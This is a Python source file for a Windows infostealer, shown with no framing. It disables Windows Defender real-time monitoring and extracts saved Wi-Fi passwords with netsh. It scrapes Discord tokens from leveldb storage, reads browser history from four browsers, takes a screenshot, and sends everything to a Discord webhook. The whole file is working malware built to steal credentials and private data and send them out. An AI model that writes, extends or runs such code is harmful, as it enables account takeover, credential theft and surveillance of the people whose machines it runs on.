import os
import sqlite3
import json
import requests
import platform
import subprocess
import shutil
import pyautogui
import psutil
import socket
from datetime import datetime, timedelta

# Discord webhook URL
DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

def disable_windows_defender():
    try:
        subprocess.run(["powershell", "Set-MpPreference", "-DisableRealtimeMonitoring", "$true"], check=True)
        return "Windows Defender disabled."
    except Exception as e:
        return f"Failed to disable Windows Defender: {e}"

def get_system_info():
    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Hostname": platform.node(),
        "Username": os.getlogin(),
        "CPU Cores": os.cpu_count(),
        "Total RAM": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
    }
    return system_info

def get_network_info():
    network_info = {}
    interfaces = psutil.net_if_addrs()
    for interface, addresses in interfaces.items():
        network_info[interface] = []
        for address in addresses:
            network_info[interface].append({
                "Family": address.family.name,
                "Address": address.address,
                "Netmask": address.netmask,
            })
    return network_info

def get_wifi_passwords():
    wifi_passwords = []
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8")
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
        for profile in profiles:
            try:
                password_output = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode("utf-8")
                password = [line.split(":")[1].strip() for line in password_output.splitlines() if "Key Content" in line][0]
                wifi_passwords.append({"SSID": profile, "Password": password})
            except Exception:
                wifi_passwords.append({"SSID": profile, "Password": "Not Available"})
    except Exception as e:
        wifi_passwords.append({"error": str(e)})
    return wifi_passwords

def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.expanduser("~") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\",
        os.path.expanduser("~") + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\",
        os.path.expanduser("~") + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\",
    ]
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".ldb") or file.endswith(".log"):
                    try:
                        with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            if "token" in content:
                                tokens.append({"file": file, "content": content})
                    except Exception as e:
                        tokens.append({"error": str(e)})
    return tokens

def get_browser_data(browser_name):


    browser_data = {}
    try:
        if browser_name.lower() == "chrome":
            data_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
            # Retrieve history
            history_db = os.path.join(data_path, "History")
            connection = sqlite3.connect(history_db)
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            history = [{"url": row[0], "title": row[1], "last_visit_time": str(datetime(1601, 1, 1) + timedelta(microseconds=row[2]))} for row in cursor.fetchall()]
            browser_data["history"] = history
            cursor.close()
            connection.close()
        elif browser_name.lower() == "firefox":
            data_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
            profiles = [folder for folder in os.listdir(data_path) if os.path.isdir(os.path.join(data_path, folder))]
            for profile in profiles:
                history_db = os.path.join(data_path, profile, "places.sqlite")
                if os.path.exists(history_db):
                    connection = sqlite3.connect(history_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC")
                    history = [{"url": row[0], "title": row[1], "last_visit_time": str(datetime(1970, 1, 1) + timedelta(microseconds=row[2]))} for row in cursor.fetchall()]
                    browser_data["history"] = history
                    cursor.close()
                    connection.close()
        elif browser_name.lower() == "edge":
            data_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\"
            # Retrieve history
            history_db = os.path.join(data_path, "History")
            connection = sqlite3.connect(history_db)
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            history = [{"url": row[0], "title": row[1], "last_visit_time": str(datetime(1601, 1, 1) + timedelta(microseconds=row[2]))} for row in cursor.fetchall()]
            browser_data["history"] = history
            cursor.close()
            connection.close()
        elif browser_name.lower() == "opera":
            data_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\"
            # Retrieve history
            history_db = os.path.join(data_path, "History")
            connection = sqlite3.connect(history_db)
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            history = [{"url": row[0], "title": row[1], "last_visit_time": str(datetime(1601, 1, 1) + timedelta(microseconds=row[2]))} for row in cursor.fetchall()]
            browser_data["history"] = history
            cursor.close()
            connection.close()
    except Exception as e:
        browser_data["error"] = str(e)
    return browser_data

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        return "Screenshot saved as screenshot.png."
    except Exception as e:
        return f"Failed to take screenshot: {e}"

def send_to_discord(data):
    payload = {
        "content": "Extracted Data",
        "embeds": [
            {
                "title": "System Information",
                "description": json.dumps(data["system_info"], indent=2),
                "color": 0x00FF00,  # Green color
            },
            {
                "title": "Network Information",
                "description": json.dumps(data["network_info"], indent=2),
                "color": 0x0000FF,  # Blue color
            },
            {
                "title": "Wi-Fi Passwords",
                "description": json.dumps(data["wifi_passwords"], indent=2),
                "color": 0xFF0000,  
				
            },
            {
                "title": "Discord Tokens",
                "description": json.dumps(data["discord_tokens"], indent=2),
                "color": 0xFFFF00,  
				
            },
            {
                "title": "Browser Data",
                "description": json.dumps(data["browser_data"], indent=2),
                "color": 0xFF00FF, 
				
            },
            {
                "title": "Screenshot",
                "description": data["screenshot"],
                "color": 0x00FFFF, 
				
            },
        ],
    }
    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print("Data sent to Discord successfully!")
    else:
        print(f"Failed to send data to Discord. Status code: {response.status_code}")

def main():
    data = {
        "system_info": get_system_info(),
        "network_info": get_network_info(),
        "wifi_passwords": get_wifi_passwords(),
        "discord_tokens": get_discord_tokens(),
        "browser_data": {
            "chrome": get_browser_data("chrome"),
            "firefox": get_browser_data("firefox"),
            "edge": get_browser_data("edge"),
            "opera": get_browser_data("opera"),
        },
        "screenshot": take_screenshot(),
    }
    send_to_discord(data)

if __name__ == "__main__":
    main()